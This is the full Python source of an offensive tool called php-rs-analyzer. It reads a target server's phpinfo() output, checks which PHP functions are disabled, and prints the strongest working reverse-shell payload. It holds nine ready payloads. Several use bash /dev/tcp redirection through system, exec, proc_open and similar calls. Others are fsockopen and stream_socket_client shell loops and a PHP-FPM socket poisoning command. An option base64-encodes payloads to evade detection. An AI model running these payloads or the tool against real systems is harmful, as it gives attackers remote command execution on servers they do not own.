#!/usr/bin/env python3
"""
php-rs-analyzer v1.0.0
PHP Reverse Shell Analyzer & Payload Generator
Author: Oussama Larhnimi
"""

import argparse
import base64
import json
import requests
import shutil
import sys
from pathlib import Path

# Disable SSL warnings for pentesting environments
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VERSION = "1.0.0"

# -----------------------------
# Colors
# -----------------------------
class C:
    R = "\033[31m"
    G = "\033[32m"
    Y = "\033[33m"
    B = "\033[34m"
    W = "\033[0m"


# -----------------------------
# Futuristic Banner
# -----------------------------
def print_banner():
    width = shutil.get_terminal_size((60, 20)).columns
    bar = "─" * (width - 34)

    banner = f"""
{C.B}╭── php-rs-analyzer {bar}╮
│{C.G}   reverse-shell • bypass • detection       {C.B}│
╰{bar}╯{C.W}
"""
    print(banner)


# -----------------------------
# Default Payload Definitions
# -----------------------------
DEFAULT_METHODS = [
    {
        "id": "proc_open",
        "name": "proc_open() Bash reverse shell",
        "requires": ["proc_open"],
        "weight": 90,
        "payload": """<?php
$desc = array(
  0=>array("pipe","r"),
  1=>array("pipe","w"),
  2=>array("pipe","w")
);
$cmd = "/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'";
$process = proc_open($cmd, $desc, $pipes);
?>"""
    },
    {
        "id": "system",
        "name": "system() Bash reverse shell",
        "requires": ["system"],
        "weight": 80,
        "payload": """<?php system("bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"); ?>"""
    },
    {
        "id": "shell_exec",
        "name": "shell_exec() Bash reverse shell",
        "requires": ["shell_exec"],
        "weight": 75,
        "payload": """<?php shell_exec("bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"); ?>"""
    },
    {
        "id": "exec",
        "name": "exec() Bash reverse shell",
        "requires": ["exec"],
        "weight": 70,
        "payload": """<?php exec("bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"); ?>"""
    },
    {
        "id": "passthru",
        "name": "passthru() Bash reverse shell",
        "requires": ["passthru"],
        "weight": 65,
        "payload": """<?php passthru("bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"); ?>"""
    },
    {
        "id": "popen",
        "name": "popen() Bash reverse shell",
        "requires": ["popen"],
        "weight": 60,
        "payload": """<?php popen("bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1","r"); ?>"""
    },
    {
        "id": "fsockopen",
        "name": "fsockopen() interactive PHP shell",
        "requires": ["fsockopen"],
        "weight": 55,
        "payload": """<?php
$s=fsockopen("{LHOST}",{LPORT});
while($cmd=fgets($s)){ fwrite($s,shell_exec($cmd)); }
?>"""
    },
    {
        "id": "stream_socket_client",
        "name": "stream_socket_client() interactive PHP shell",
        "requires": ["stream_socket_client"],
        "weight": 50,
        "payload": """<?php
$s=stream_socket_client("tcp://{LHOST}:{LPORT}");
while($cmd=fgets($s)){ fwrite($s,shell_exec($cmd)); }
?>"""
    },
    {
        "id": "php_fpm_poisoning",
        "name": "PHP-FPM socket poisoning reverse shell",
        "requires": ["stream_socket_sendto"],
        "weight": 40,
        "needs_php_fpm": True,
        "payload": """# PHP-FPM socket poisoning
printf "<?php system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'); ?>" |
socat - UNIX-CONNECT:/run/php/php-fpm.sock
"""
    }
]

METHODS = DEFAULT_METHODS.copy()


# -----------------------------
# Load Custom Methods (JSON)
# -----------------------------
def load_methods(json_path):
    global METHODS
    if not json_path:
        METHODS = DEFAULT_METHODS.copy()
        return

    p = Path(json_path)
    if not p.exists():
        print(f"{C.Y}[WARN]{C.W} payloads.json not found. Using default.")
        METHODS = DEFAULT_METHODS.copy()
        return

    try:
        data = json.loads(p.read_text())
        if isinstance(data, list):
            METHODS = data
            print(f"{C.G}[OK]{C.W} Loaded {len(data)} custom payload methods.")
    except Exception as e:
        print(f"{C.Y}[WARN]{C.W} JSON parse error: {e}")
        METHODS = DEFAULT_METHODS.copy()


# -----------------------------
# Obfuscation Support
# -----------------------------
def obfuscate_cmd(cmd):
    encoded = base64.b64encode(cmd.encode()).decode()
    return f"$c=base64_decode('{encoded}'); system($c);"


def build_payload(method, lhost, lport, obf=False):
    if obf:
        if method["id"] in ["system", "exec", "shell_exec", "passthru", "popen", "proc_open"]:
            orig = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            encoded = base64.b64encode(orig.encode()).decode()

            return f"""<?php
$cmd=base64_decode('{encoded}');
{method['id']}($cmd);
?>"""

    return method["payload"].format(LHOST=lhost, LPORT=lport)


# -----------------------------
# HTTP Loader
# -----------------------------
def load_phpinfo(url=None, file=None, headers=None, proxy=None, auth=None, timeout=10):
    if url:
        req_headers = {}
        if headers:
            for h in headers:
                if ":" in h:
                    k,v = h.split(":",1)
                    req_headers[k.strip()] = v.strip()

        proxies = {"http": proxy, "https": proxy} if proxy else None

        auth_t = None
        if auth and ":" in auth:
            user,pw = auth.split(":",1)
            auth_t = (user,pw)

        r = requests.get(url, headers=req_headers, proxies=proxies,
                         auth=auth_t, timeout=timeout, verify=False)

        r.raise_for_status()
        return r.text

    if file:
        return Path(file).read_text(errors="ignore")

    print(f"{C.R}[ERROR]{C.W} --url or --file required")
    sys.exit(1)


# -----------------------------
# Parse disable_functions
# -----------------------------
def parse_disable_functions(phpinfo):
    try:
        part = phpinfo.split("disable_functions",1)[1]
        part = part.split('<td class="v">',1)[1]
        funcs = part.split("</td>")[0]
        return [f.strip() for f in funcs.split(",") if f.strip()]
    except:
        print(f"{C.R}[ERROR]{C.W} Could not parse disable_functions.")
        return []


# -----------------------------
# Detect PHP-FPM
# -----------------------------
def detect_php_fpm(phpinfo):
    t = phpinfo.lower()
    return "php-fpm" in t or "php fpm" in t


# -----------------------------
# Analyze
# -----------------------------
def analyze(disabled, phpinfo, lhost, lport, mode="best", obf=False, export_path=None):
    print(f"\n{C.B}[i]{C.W} disable_functions:")
    print("  " + (", ".join(disabled) if disabled else "(empty)"))

    php_fpm = detect_php_fpm(phpinfo)
    print(f"{C.B}[i]{C.W} PHP-FPM detected: {'yes' if php_fpm else 'no'}")

    usable = []

    for m in METHODS:
        blocked = any(req in disabled for req in m["requires"])

        if blocked:
            print(f"\n - {m['name']}: {C.R}BLOCKED{C.W}")
            continue

        if m.get("needs_php_fpm") and not php_fpm:
            print(f"\n - {m['name']}: {C.Y}UNAVAILABLE (PHP-FPM NOT FOUND){C.W}")
            continue

        print(f"\n - {m['name']}: {C.G}OK{C.W}")
        usable.append(m)

    if not usable:
        print(f"\n{C.R}[!] No usable reverse shell methods found!{C.W}")
        return

    usable.sort(key=lambda x: x["weight"], reverse=True)

    payload_output = ""

    if mode == "best":
        best = usable[0]
        print(f"\n{C.G}[BEST]{C.W} Selected: {best['name']}")
        payload = build_payload(best, lhost, lport, obf)
        payload_output = payload
        print("\n" + "-"*60)
        print(payload)
        print("-"*60)

    else:
        print(f"\n{C.G}[ALL PAYLOADS]{C.W}")
        parts = []
        for m in usable:
            p = build_payload(m, lhost, lport, obf)
            print(f"\n### {m['name']} ###")
            print("-"*60)
            print(p)
            print("-"*60)
            parts.append(f"// {m['name']}\n{p}")
        payload_output = "\n\n".join(parts)

    if export_path:
        Path(export_path).write_text(payload_output)
        print(f"\n{C.G}[OK]{C.W} Exported to {export_path}\n")


# -----------------------------
# Colored Help Formatter
# -----------------------------
class ColoredHelpFormatter(argparse.HelpFormatter):
    def start_section(self, heading):
        heading = f"{C.B}{heading}{C.W}"
        return super().start_section(heading)

    def add_usage(self, usage, actions, groups, prefix=None):
        return super().add_usage(usage, actions, groups, prefix)


# -----------------------------
# MAIN
# -----------------------------
def main():
    parser = argparse.ArgumentParser(
        description=f"{C.G}PHP Reverse Shell Analyzer & Payload Generator{C.W}",
        formatter_class=ColoredHelpFormatter
    )

    # Core Options
    core = parser.add_argument_group("Core Options")
    core.add_argument("--url", help="URL to phpinfo() output")
    core.add_argument("--file", help="Local phpinfo() HTML file")
    core.add_argument("--lhost", required=True, help="Listener IP")
    core.add_argument("--lport", required=True, help="Listener port")
    core.add_argument("--mode", choices=["best", "all"], default="best",
                      help="best = strongest method, all = list all valid")

    # HTTP Options
    http = parser.add_argument_group("HTTP Options")
    http.add_argument("--header", action="append", help="Custom HTTP header")
    http.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    http.add_argument("--auth", help="HTTP Basic Auth user:pass")
    http.add_argument("--timeout", type=int, default=10, help="Timeout seconds")

    # Payload Options
    po = parser.add_argument_group("Payload Options")
    po.add_argument("--obfuscate", action="store_true", help="Use Base64 obfuscation")
    po.add_argument("--payloads", help="Custom payload methods JSON file")
    po.add_argument("--export", help="Export payload(s) to file")

    # Meta Options
    meta = parser.add_argument_group("Meta Options")
    meta.add_argument("--no-banner", action="store_true", help="Disable banner")
    meta.add_argument("--version", action="store_true", help="Show version")
    meta.add_argument("--check-updates", action="store_true", help="Check GitHub for updates")

    args = parser.parse_args()

    # Handle version
    if args.version:
        print(f"php-rs-analyzer version {VERSION}")
        sys.exit(0)

    # Handle update check
    if args.check_updates:
        try:
            r = requests.get("https://api.github.com/repos/echoosso/php-rs-analyzer/releases/latest")
            if r.status_code == 200:
                latest = r.json().get("tag_name")
                if latest != VERSION:
                    print(f"{C.G}[UPDATE]{C.W} New version available: {latest}")
                else:
                    print(f"{C.G}[OK]{C.W} You are using the latest version.")
        except Exception as e:
            print(f"{C.R}[ERROR]{C.W} Update check failed: {e}")
        sys.exit(0)

    # Print banner unless disabled
    if not args.no_banner:
        print_banner()

    # Load methods
    load_methods(args.payloads)

    # Load phpinfo
    phpinfo = load_phpinfo(
        url=args.url,
        file=args.file,
        headers=args.header,
        proxy=args.proxy,
        auth=args.auth,
        timeout=args.timeout
    )

    # Parse disable_functions
    disabled = parse_disable_functions(phpinfo)

    # Analyze
    analyze(
        disabled=disabled,
        phpinfo=phpinfo,
        lhost=args.lhost,
        lport=args.lport,
        mode=args.mode,
        obf=args.obfuscate,
        export_path=args.export
    )


if __name__ == "__main__":
    main()
